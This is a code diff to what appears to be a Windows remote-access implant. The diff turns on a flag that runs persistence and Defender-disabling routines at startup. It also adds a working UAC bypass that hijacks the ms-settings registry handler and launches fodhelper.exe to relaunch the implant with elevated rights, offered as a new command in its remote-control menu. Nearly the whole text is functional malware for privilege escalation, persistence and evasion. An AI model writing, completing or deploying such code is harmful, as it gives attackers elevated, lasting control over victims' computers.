@@ -20,7 +20,7 @@
 // #define _M_X64 // for peb
 #define DO_SPECIAL_PEB_FIND
 
-//#define GO_FOR_THROAT
+#define GO_FOR_THROAT
 
 #ifdef LOCALTEST
 #define ADDRESS "192.168.1.96"
@@ -513,6 +513,62 @@ void attemptFullPersistenceNoNetwork(TCHAR* dirName) {
 	return;
 }
 
+void bypassUACWithFod(TCHAR* dirName) {
+	attemptFullPersistenceNoNetwork(dirName);
+	// Lets move the file first
+
+	wchar_t opDirName[MAX_PATH];
+
+	GetModuleFileNameW(NULL, opDirName, MAX_PATH);
+
+	// Turns out the 'easy way' is much worse.
+	wchar_t powerShellPath[MAX_PATH];
+	memcpy(powerShellPath, opDirName, MAX_PATH * sizeof(wchar_t));
+
+	// It will always be null terminated.
+	wchar_t * name = wcsrchr(powerShellPath, L'\\');
+
+	memset(name, 0, (lstrlen(name) + 1) * sizeof(wchar_t));
+	wcscat(powerShellPath, L"\\inter.ps1");
+
+	wchar_t line[100] = L"echo [String]$gushellpath = \"";
+	wcscat(line, dirName);
+	wcscat(line, L"\" > inter.ps1");
+
+	_wsystem(line);
+	system("echo New-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force >> inter.ps1");
+	system("echo New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force >> inter.ps1");
+	
+	wchar_t commandwArgs[MAX_PATH + 5];
+	memcpy(commandwArgs, dirName, MAX_PATH);
+	wcscat(commandwArgs, L" Balls");
+
+	HKEY key;
+	LSTATUS rv;
+	rv = pRegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, KEY_WRITE, &key);
+	if (rv != ERROR_SUCCESS) {
+		printf("Failed to open key. %d\n", rv);
+	}
+
+	rv = pRegSetValueExW(key, NULL, 0, REG_SZ, (LPBYTE)commandwArgs, (lstrlen(commandwArgs) + 1) * sizeof(TCHAR));
+	if (rv != ERROR_SUCCESS) {
+		printf("Error HEREHERE %d", rv);
+	}
+
+	//pRegCloseKey(key);
+	
+	//system("echo Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value $gushellpath -Force >> inter.ps1");
+	system("echo Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" >> inter.ps1");
+	
+	wchar_t line2[300] = L"PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
+	wcscat(line2, powerShellPath);
+	wcscat(line2, L"\"");
+
+	//_wsystem(line2);
+	system("C:\\Windows\\System32\\fodhelper.exe");
+
+}
+
 // Cleaning up some stuff
 void cleanManagerInput(char* command, size_t size) {
 
@@ -526,6 +582,7 @@ void cleanManagerInput(char* command, size_t size) {
 }
 
 int main(int argc, char* argv[]) {
+
 
 	GetAPIFromPeb();
 
@@ -542,11 +599,15 @@ int main(int argc, char* argv[]) {
 
 	SOCKET sockfd;
 	TCHAR* dirName = (TCHAR*)malloc(MAX_PATH * sizeof(TCHAR));
-	GetModuleFileNameW(NULL, dirName, 100);
+	GetModuleFileNameW(NULL, dirName, MAX_PATH);
+
+	if (argc == 2) {
+		_wsystem(dirName);
+	}
 
 #ifdef GO_FOR_THROAT
 	attemptFullPersistenceNoNetwork(dirName);
-	attemptDefeatDefenderNoNetwork()
+	attemptDefeatDefenderNoNetwork();
 #endif
 
 	char commandList[] =
@@ -598,6 +659,11 @@ int main(int argc, char* argv[]) {
 
 		if (strcmp(commandOpt, "4") == 0) {
 			attemptFullPersistence(&sockfd, dirName);
+			continue;
+		}
+
+		if (strcmp(commandOpt, "5") == 0) {
+			bypassUACWithFod(dirName);
 			continue;
 		}
 
